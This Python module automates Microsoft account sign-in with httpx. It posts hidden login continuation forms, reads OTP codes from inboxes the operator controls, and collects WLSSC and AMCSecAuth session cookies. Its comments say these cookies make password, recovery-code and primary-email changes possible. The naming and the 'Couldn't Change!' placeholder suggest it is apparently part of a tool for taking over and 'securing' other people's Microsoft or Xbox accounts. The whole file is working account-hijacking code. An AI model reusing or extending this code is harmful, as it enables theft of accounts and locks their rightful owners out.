import logging
import re
import time

import httpx

from securing.utils.cookies.safe_cookies import has_cookie

# MSAL bridge / SSO pages can stall forever when timeout=None.
_POLISH_TIMEOUT = httpx.Timeout(25.0, connect=10.0)


def _extract_sso_redirect(html: str) -> str | None:
    """Pull complete-sso-with-redirect URL from polish / MSAL bridge HTML."""
    patterns = (
        r'https://account\.microsoft\.com/auth/complete-sso-with-redirect\?state=[A-Za-z0-9_\-+/=]+',
        r'content="\d+;(https://account\.microsoft\.com/auth/complete-sso-with-redirect\?state=[A-Za-z0-9_\-+/=]+)"',
        r'location\.replace\("(https://account\.microsoft\.com/auth/complete-sso-with-redirect\?state=[A-Za-z0-9_\-+/=]+)"\)',
        r'window\.location\.replace\("(https://account\.microsoft\.com/auth/complete-sso-with-redirect\?state=[A-Za-z0-9_\-+/=]+)"\)',
    )
    for pat in patterns:
        m = re.search(pat, html)
        if m:
            return m.group(1) if m.lastindex else m.group(0)
    return None


def _login_cookies_present(session: httpx.AsyncClient) -> bool:
    """True when MSA login cookies exist (NOT enough for account.microsoft.com APIs)."""
    return (
        has_cookie(session, "MSPAuth")
        or has_cookie(session, "__Host-MSAAUTH")
        or has_cookie(session, "__Host-MSAAUTHP")
        or has_cookie(session, "WLSSC")
    )


def _amc_api_ready(session: httpx.AsyncClient) -> bool:
    """True when account.microsoft.com profile/billing APIs can authorize."""
    return has_cookie(session, "AMCSecAuthJWT") or has_cookie(session, "AMCSecAuth")


def _amc_home_ready(session: httpx.AsyncClient) -> bool:
    """Home APIs (devices/family) need AMCSecAuth — JWT alone still 401s them."""
    return has_cookie(session, "AMCSecAuth")


def _session_ready(session: httpx.AsyncClient) -> bool:
    # Kept for callers; prefer _amc_api_ready when deciding to skip AMC SSO.
    return _amc_api_ready(session) or _login_cookies_present(session)


def _is_msal_bridge(html: str) -> bool:
    return (
        "MSALBrowserBundleName" in html
        or "complete-client-signin-oauth" in html
        or "ssoSilent" in html
    )


# ---------------------------------------------------------------------------
# Login continuation forms
#
# Microsoft finishes a classic (non-MSAL) login with a hidden-input form the
# browser posts on the user's behalf:
#
#   * BSso      -> ppsecure/bsso.srf  (pprid / NAP / ANON / t)
#   * post.srf  -> ppsecure/post.srf  (login / resp / PPFT / wreply / t)
#
# That post is what turns an accepted OTP into a real signed-in session
# (WLSSC). httpx never did it, so the session stayed half-signed-in:
# account.live.com kept answering with the sign-in page (i5030) and every
# password / recovery-code / primary-email change was refused.
#
# The sign-in page itself also carries a form, so a marker is required --
# posting that one would just re-render the sign-in page.
# ---------------------------------------------------------------------------


def _hidden_inputs(html: str) -> dict[str, str]:
    """Every ``<input name=... value=...>`` in ``html``."""
    out: dict[str, str] = {}
    for tag in re.findall(r"<input\b[^>]*>", html or "", re.I):
        name_m = re.search(r'\bname="([^"]+)"', tag, re.I)
        if not name_m:
            continue
        value_m = re.search(r'\bvalue="([^"]*)"', tag, re.I)
        out[name_m.group(1)] = value_m.group(1) if value_m else ""
    return out


def _login_form(html: str) -> tuple[str, dict[str, str]] | None:
    """The login-continuation form on ``html`` as ``(action, fields)``.

    Returns ``None`` when the page carries no such form (e.g. the plain
    sign-in page, or the JavaScript-only MSAL bridge).
    """
    text = html or ""
    blocks = re.findall(r"<form\b[^>]*>.*?</form>", text, re.I | re.S)
    if not blocks:
        blocks = [text]
    for block in blocks:
        action_m = re.search(r'\baction="([^"]*)"', block, re.I)
        if not action_m:
            continue
        action = action_m.group(1).replace("&amp;", "&").strip()
        if not action:
            continue
        if action.startswith("/"):
            action = "https://login.live.com" + action
        fields = _hidden_inputs(block)
        if not fields:
            continue
        keys = {k.lower() for k in fields}
        if "pprid" in keys and fields.get("pprid"):
            return action, fields
        if "resp" in keys and fields.get("resp"):
            return action, fields
        if {"nap", "anon"} <= keys and fields.get("NAP") and fields.get("ANON"):
            return action, fields
        if (
            {"login", "wreply", "ppft"} <= keys
            and fields.get("wreply")
            and fields.get("t")
        ):
            return action, fields
    return None


async def _submit_login_form(
    session: httpx.AsyncClient,
    html: str,
) -> httpx.Response | None:
    """Post the login-continuation form on ``html`` (all of its hidden fields)."""
    form = _login_form(html)
    if not form:
        return None
    action, fields = form
    try:
        resp = await session.post(
            url=action,
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": "https://login.live.com/",
            },
            data=fields,
            follow_redirects=True,
            timeout=_POLISH_TIMEOUT,
        )
    except (httpx.TimeoutException, httpx.TransportError) as exc:
        logging.warning("polish_host: continuation form post failed (%s)", exc)
        return None
    logging.info(
        "polish_host: continuation form posted -> status=%s url=%s wlssc=%s amc=%s",
        resp.status_code,
        str(resp.url)[:160],
        has_cookie(session, "WLSSC"),
        has_cookie(session, "AMCSecAuth"),
    )
    return resp


async def _follow_login_forms(
    session: httpx.AsyncClient,
    response: httpx.Response,
    *,
    max_forms: int = 3,
) -> httpx.Response:
    """Submit the continuation forms a browser would submit, in order.

    Stops as soon as WLSSC shows up or the page stops carrying a form.
    """
    seen: set[tuple[str, str]] = set()
    current = response
    for _ in range(max_forms):
        form = _login_form(current.text or "")
        if not form:
            break
        action, fields = form
        marker = (
            action,
            fields.get("resp") or fields.get("pprid") or fields.get("t") or "",
        )
        if marker in seen:
            break
        seen.add(marker)
        resp = await _submit_login_form(session, current.text or "")
        if resp is None:
            break
        current = resp
        print(
            "[+] - Polish: submitted login continuation form "
            f"(status={current.status_code}, "
            f"WLSSC={'yes' if has_cookie(session, 'WLSSC') else 'no'})",
            flush=True,
        )
        if has_cookie(session, "WLSSC"):
            break
    return current


async def _bsso_handshake(
    session: httpx.AsyncClient,
    portal: str = "https://account.live.com/",
) -> bool:
    """Finish the account.live.com handshake so WLSSC is issued.

    account.live.com answers a signed-in login.live.com request with the BSso
    interrupt form (pprid / NAP / ANON / t). A browser posts it to
    ppsecure/bsso.srf, and *that* response is what sets WLSSC -- the cookie
    every later security change needs. httpx never posted it, so the session
    stayed half-signed-in and account.live.com kept answering with the
    sign-in page.
    """
    try:
        resp = await session.get(
            portal,
            follow_redirects=True,
            timeout=_POLISH_TIMEOUT,
        )
    except (httpx.TimeoutException, httpx.TransportError) as exc:
        logging.warning("bsso handshake: GET %s failed (%s)", portal, exc)
        return False

    form = _login_form(resp.text or "")
    if not form:
        logging.info(
            "bsso handshake: no BSso form at %s (status=%s len=%s)",
            portal,
            resp.status_code,
            len(resp.text or ""),
        )
        return False

    action, fields = form
    try:
        out = await session.post(
            url=action,
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": portal,
            },
            data=fields,
            follow_redirects=True,
            timeout=_POLISH_TIMEOUT,
        )
    except (httpx.TimeoutException, httpx.TransportError) as exc:
        logging.warning("bsso handshake: POST %s failed (%s)", action[:120], exc)
        return False

    ok = has_cookie(session, "WLSSC")
    logging.info(
        "bsso handshake %s -> status=%s url=%s wlssc=%s",
        portal,
        out.status_code,
        str(out.url)[:160],
        ok,
    )
    if ok:
        print("[+] - Polish: account.live.com handshake issued WLSSC", flush=True)
    return ok


# Cookies only issued once the login actually finished. ``__Host-MSAAUTH`` is
# set as soon as the OTP is accepted, so it is NOT a "signed in" signal.
_SESSION_COOKIES = ("WLSSC", "MSPAuth", "AMCSecAuth", "AMCSecAuthJWT")

# The cookies account.live.com actually needs for a security change: WLSSC is
# the login.live.com session, AMCSecAuth(JWT) is the account-portal one.
# ``MSPAuth`` is set early in the flow and does NOT mean the login finished.
_SECURITY_SESSION_COOKIES = ("WLSSC", "AMCSecAuth", "AMCSecAuthJWT")


def login_session_ready(session: httpx.AsyncClient) -> bool:
    """True when login.live.com / account APIs have a real signed-in session.

    A half-finished login leaves ``__Host-MSAAUTH`` behind with no WLSSC: the
    classic ``t`` token comes back as the i5030 sign-in page, AMC silent
    sign-in is denied and Xbox sisu SSO bounces to a login page.
    """
    return any(has_cookie(session, name) for name in _SESSION_COOKIES)


def security_session_ready(session: httpx.AsyncClient) -> bool:
    """True when the session can actually change account.live.com settings.

    Unlike :func:`login_session_ready` this ignores ``MSPAuth``, which is set
    before the login finished. A session with only ``MSPAuth`` still gets the
    i5030 sign-in page back and every security change is refused.
    """
    return any(has_cookie(session, name) for name in _SECURITY_SESSION_COOKIES)


async def _post_kmsi(session: httpx.AsyncClient, url_post: str, ppft: str):
    """Finish/continue the login: the type=28 form the browser submits."""
    return await session.post(
        url=url_post,
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": (
                "text/html,application/xhtml+xml,application/xml;q=0.9,"
                "image/avif,image/webp,image/apng,*/*;q=0.8,"
                "application/signed-exchange;v=b3;q=0.7"
            ),
        },
        data=f"PPFT={ppft}&canary=&LoginOptions=3&type=28&hpgrequestid=&ctx=",
        follow_redirects=True,
        timeout=_POLISH_TIMEOUT,
    )


async def _ensure_wlscc(session: httpx.AsyncClient) -> bool:
    """Make sure the account.live.com session (WLSSC) exists.

    The BSso handshake is the only thing that issues WLSSC, so it is worth
    repeating while the session is still missing it. A failed handshake is
    usually a stale cookie jar rather than a dead account.
    """
    if has_cookie(session, "WLSSC"):
        return True
    for portal in (
        "https://account.live.com/",
        "https://account.live.com/proofs/Manage/additional",
    ):
        if await _bsso_handshake(session, portal):
            return True
    return False


async def _retry_kmsi_with_fresh_tokens(session: httpx.AsyncClient) -> str | None:
    """Re-finish the login with tokens scraped from the *current* page.

    When the type=28 reply is a login page instead of the MSAL SSO bridge the
    tokens we sent were stale (already consumed by the OTP/password post). A
    fresh login page normally carries usable ones, so retry once or twice and
    return the ``complete-sso-with-redirect`` URL if the bridge appears.
    """
    from securing.utils.cookies.get_livedata import livedata

    for attempt in (1, 2):
        try:
            live = await livedata(session)
        except Exception:
            logging.exception("polish retry: livedata failed")
            return None
        url_post = (live or {}).get("urlPost")
        ppft = (live or {}).get("ppft")
        if not (url_post and ppft):
            return None
        try:
            resp = await _post_kmsi(session, url_post, ppft)
        except (httpx.TimeoutException, httpx.TransportError) as exc:
            logging.warning("polish retry %s transport error: %s", attempt, exc)
            continue
        logging.info(
            "Polish retry response (attempt %s): %s",
            attempt,
            (resp.text or "")[:2000],
        )
        # A fresh reply can carry the continuation form instead of an SSO URL.
        resp = await _follow_login_forms(session, resp)
        sso = _extract_sso_redirect(resp.text or "")
        if sso:
            print(f"[+] - Polish: login finished with fresh tokens (attempt {attempt})")
            return sso
        if has_cookie(session, "WLSSC"):
            print(
                f"[+] - Polish: login finished with fresh tokens (attempt {attempt})"
            )
            return None
    return None


async def ensure_login_session(
    session: httpx.AsyncClient,
    email: str,
    security_email: str | None = None,
    *,
    otp_timeout: float = 75.0,
) -> bool:
    """Re-run the OTP login to finish a half-established login.live.com session.

    The OTP destination is Microsoft's choice, not ours: ``send_auth`` reports
    which proof the code is going to (``otc_inbox``) and steers to a proof we
    can read whenever there is one. The caller-supplied ``security_email`` is
    only a hint -- this runs before any security email is known, so the value
    is still the "Couldn't Change!" placeholder. Gating on it made the whole
    recovery path unreachable, which is why a dead session was never repaired.
    """
    from mail.settings import is_our_inbox
    from securing.auth.get_msaauth import get_msaauth
    from securing.auth.send_auth import send_auth
    from securing.utils.cookies.get_email_code import get_email_code
    from securing.utils.cookies.get_livedata import livedata

    if not email:
        logging.warning("login session recovery skipped — no account email")
        return False

    hint = str(security_email or "").strip()

    for attempt in (1, 2):
        since = time.time()
        try:
            live = await livedata(session)
        except Exception:
            logging.exception("login session recovery: livedata failed")
            return False
        try:
            info = await send_auth(session, email)
        except Exception:
            logging.exception("login session recovery: send_auth failed")
            return False
        if not isinstance(info, dict):
            logging.warning(
                "login session recovery: unexpected send_auth payload for %s", email
            )
            return False
        flowtoken = info.get("gotc_flowtoken")
        if not flowtoken:
            logging.warning(
                "login session recovery: no OTP flow token for %s (resp=%r)",
                email,
                info.get("type"),
            )
            return False
        if not info.get("otc_sent"):
            logging.warning(
                "login session recovery: Microsoft did not dispatch a code for %s "
                "(destination=%r)",
                email,
                info.get("otc_destination"),
            )
            return False
        inbox = info.get("otc_inbox")
        if not inbox and is_our_inbox(hint):
            inbox = hint
        if not inbox or not is_our_inbox(inbox):
            logging.warning(
                "login session recovery skipped — OTP inbox for %s is not readable "
                "(destination=%r)",
                email,
                info.get("otc_destination"),
            )
            return False
        print(
            f"[~] - Login session recovery {attempt}/2: waiting for code in {inbox}...",
            flush=True,
        )
        code = await get_email_code(inbox, timeout=otp_timeout, since=since)
        if not code:
            print(
                "[!] - Login session recovery: no code arrived in the security mailbox",
                flush=True,
            )
            return False
        try:
            msaauth = await get_msaauth(session, email, flowtoken, live, code)
        except Exception:
            logging.exception("login session recovery: get_msaauth failed")
            continue
        if not isinstance(msaauth, dict) or msaauth.get("_error"):
            logging.warning(
                "login session recovery attempt %s rejected: %r", attempt, msaauth
            )
            continue
        try:
            await polish_host(session, msaauth)
        except Exception:
            logging.exception("login session recovery: polish failed")
        if not security_session_ready(session):
            logging.warning(
                "login session recovery attempt %s: login finished but the session "
                "is still incomplete (no WLSSC/AMCSecAuth)",
                attempt,
            )
            continue
        print(f"[+] - Login session recovery {attempt}/2: login re-established", flush=True)
        return True
    return False


async def polish_host(session: httpx.AsyncClient, post_data: dict) -> str:
    # Persist Microsoft session (WLSSC / AMCSecAuthJWT) for account.microsoft.com APIs.
    # Never block forever: MSAL JS bridge SSO GETs hang with timeout=None.
    from securing.utils.cookies.ensure_amc_jwt import ensure_amc_jwt

    if post_data.get("_cookies_only"):
        print("[~] - Polish: cookies-only path (MSAAUTH already present)")
        logging.info("polish_host: cookies-only — hitting account portals for AMC/WLSSC")
        for portal in (
            "https://account.live.com/",
            "https://account.microsoft.com/",
        ):
            try:
                resp = await session.get(
                    portal,
                    follow_redirects=True,
                    timeout=_POLISH_TIMEOUT,
                )
                logging.info(
                    "polish_host cookies-only %s -> status=%s url=%s",
                    portal,
                    resp.status_code,
                    resp.url,
                )
            except (httpx.TimeoutException, httpx.TransportError) as exc:
                logging.warning("polish_host cookies-only %s failed: %s", portal, exc)
        await _ensure_wlscc(session)
        await ensure_amc_jwt(session)
        return ""

    polish = await _post_kmsi(session, post_data["urlPost"], post_data["ppft"])

    logging.info("Polish Host Response: %s", polish.text[:2000])
    print(f"[+] - Polish Host Response: {polish.text[:500]}")

    # A browser submits the form this page carries; that post is what turns an
    # accepted OTP into a real signed-in session (WLSSC). Skip it and
    # account.live.com keeps answering with the sign-in page, so every later
    # password / recovery-code / primary-email change is refused.
    polish = await _follow_login_forms(session, polish)

    if 'PageID" content="BssoInterrupt"' in polish.text or "BssoInterrupt" in polish.text:
        logging.info("polish_host: BssoInterrupt — no continuation form on the page")
        print("[~] - Polish hit BssoInterrupt; relying on existing session cookies")
        await _ensure_wlscc(session)
        await ensure_amc_jwt(session)
        return polish.text

    # account.live.com hands out the BSso form that issues WLSSC.
    await _ensure_wlscc(session)

    # JWT alone is enough for MSADELEGATE + owner-info fallback, but home APIs
    # (devices/family) need AMCSecAuth from the SSO form finish. Only skip the
    # MSAL SSO GET when AMCSecAuth is already present.
    if _amc_home_ready(session) and _is_msal_bridge(polish.text):
        print("[~] - Polish: MSAL bridge + AMCSecAuth present — skipping SSO GET")
        return polish.text

    if _amc_home_ready(session) and not _extract_sso_redirect(polish.text):
        print("[~] - Polish: AMCSecAuth present, no SSO URL — done")
        return polish.text

    sso_redirect = _extract_sso_redirect(polish.text)
    if not sso_redirect and not _amc_home_ready(session):
        # A login page here means the type=28 post used tokens the login flow
        # had already consumed. Re-finish once with tokens from the live page:
        # without it the session never gets WLSSC, so get_t returns i5030, AMC
        # silent sign-in is denied and Xbox sisu SSO dies on a login page.
        sso_redirect = await _retry_kmsi_with_fresh_tokens(session)

    if not sso_redirect:
        logging.warning("polish_host: no complete-sso-with-redirect URL in response")
        print("[!] - Polish: no SSO redirect URL found — bootstrapping AMC JWT")
        await _ensure_wlscc(session)
        await ensure_amc_jwt(session)
        return polish.text

    # If we already have AMCSecAuth, SSO form is optional — don't risk a hang.
    if _amc_home_ready(session):
        print("[~] - Polish: AMCSecAuth already set — skipping SSO GET")
        return polish.text

    if _amc_api_ready(session) and not _amc_home_ready(session):
        print("[~] - Polish: have AMC JWT but not AMCSecAuth — finishing SSO for home APIs")
    else:
        print("[~] - Polish: following SSO redirect…")
    try:
        auth = await session.get(
            url=sso_redirect,
            follow_redirects=True,
            timeout=_POLISH_TIMEOUT,
        )
    except (httpx.TimeoutException, httpx.TransportError) as exc:
        logging.warning("polish_host: SSO GET failed (%s) — continuing with cookies", exc)
        print(f"[!] - Polish SSO GET failed ({exc.__class__.__name__}); continuing")
        await _ensure_wlscc(session)
        await ensure_amc_jwt(session)
        return polish.text

    # The SSO page can carry the same continuation form.
    auth = await _follow_login_forms(session, auth)

    form = _login_form(auth.text or "")
    if not form:
        logging.warning("polish_host: SSO page missing form fields")
        print("[!] - Polish: SSO page missing form fields — bootstrapping AMC JWT")
        await _ensure_wlscc(session)
        await ensure_amc_jwt(session)
        return auth.text

    action, fields = form
    try:
        await session.post(
            url=action,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=fields,
            follow_redirects=True,
            timeout=_POLISH_TIMEOUT,
        )
    except (httpx.TimeoutException, httpx.TransportError) as exc:
        logging.warning("polish_host: SSO form post failed (%s)", exc)
        print(f"[!] - Polish SSO form post failed ({exc.__class__.__name__})")

    await _ensure_wlscc(session)

    if not _amc_api_ready(session):
        await ensure_amc_jwt(session)

    if not security_session_ready(session):
        logging.warning(
            "polish_host: finished without a usable session (WLSSC/AMCSecAuth missing) "
            "— account.live.com changes will be refused"
        )
        print(
            "[!] - Polish finished without a usable Microsoft session "
            "(no WLSSC/AMCSecAuth) — account.live.com changes will be refused"
        )

    return auth.text
